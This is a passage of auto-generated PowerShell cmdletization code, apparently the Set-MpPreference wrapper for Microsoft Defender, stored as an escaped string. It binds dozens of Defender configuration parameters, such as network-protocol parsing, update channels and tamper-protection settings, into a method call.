[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableTlsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableFtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableFtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableHttpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdlet"
"ization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSshParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\r\n          [object]$__cmdletization_value = ${DisableGradualRelease}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\r\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\r\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableRdpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\r\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\r\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {\r\n          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleOffset}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultV"
"alueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {\r\n          [object]$__cmdletization_value = ${DisableTDTFeature}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTamperProtection')) {\r\n          [object]$__cmdletization_value = ${DisableTamperProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSmtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSmtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableQuicParsing')) {\r\n          [object]$__cmdletization_value = ${DisableQuicParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkProtectionReputationMode')) {\r\n          [object]$__cmdletization_value = ${NetworkProtectionReputationMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IntelTDTEnabled')) {\r\n          [object]$__cmdletization_value = ${IntelTDTEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('OobeEnableRtpAndSigUpdate')) {\r\n          [object]$__cmdletization_value = ${OobeEnableRtpAndSigUpdate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PerformanceModeStatus')) {\r\n          [object]$__cmdletization_value = ${PerformanceModeStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuickScanIncludeExclusions')) {\r\n          [object]$__cmdletization_value = ${QuickScanIncludeExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCacheMaintenance')) {\r\n          [object]$__cmdletization_value = ${DisableCacheMaintenance}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoveScanningThreadPoolCap')) {\r\n          [object]$__cmdletization_value = ${RemoveScanningThreadPoolCap}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                